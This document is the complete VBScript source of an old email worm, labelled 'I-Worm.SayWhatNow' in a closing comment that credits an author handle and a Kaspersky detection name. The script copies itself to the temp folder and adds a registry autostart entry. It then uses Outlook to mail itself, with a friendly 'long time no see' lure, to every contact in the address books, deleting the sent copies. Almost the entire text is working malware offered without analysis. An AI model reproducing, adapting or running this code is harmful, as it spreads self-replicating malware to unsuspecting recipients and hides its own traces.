On Error Resume Next

Dim who, what, where, why, how

Dim right, wrong

Set right = CreateObject( "Scripting.FileSystemObject" )
right.CopyFile WScript.ScriptFullName, right.BuildPath( right.GetSpecialFolder(2), "saywhatnow.vbs" )

Set wrong = CreateObject( "WScript.Shell" )
wrong.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\" & "sywhatnow", right.BuildPath( right.GetSpecialFolder(2), "saywhatnow.vbs" )

Set who = CreateObject( "Outlook.Application" )
Set what = who.GetNameSpace( "MAPI" )

For Each where In what.AddressLists
    For why = 1 To where.AddressEntries.Count
        Set how = who.CreateItem( 0 )

        how.BCC = where.AddressEntries( why ).Address

        how.Subject = "Wassssssup"
        how.Body = "How u been long time no see!
Don't be a strange and drop me a line sometime soon.
K Thanks...

Cya Soon!"
        how.Attachments.Add WScript.ScriptFullName
        how.DeleteAfterSubmit = True
        how.Send
    Next
Next

'Worm Name: I-Worm.SayWhatNow (VBS)
'Written By: -=[Azag-TH0TH]=-

'Detected as: I-Worm.Saywa by Kaspersky Anti-Virus (see http://download2.avp-de.com/'avpfiles/databases/up040416.txt)
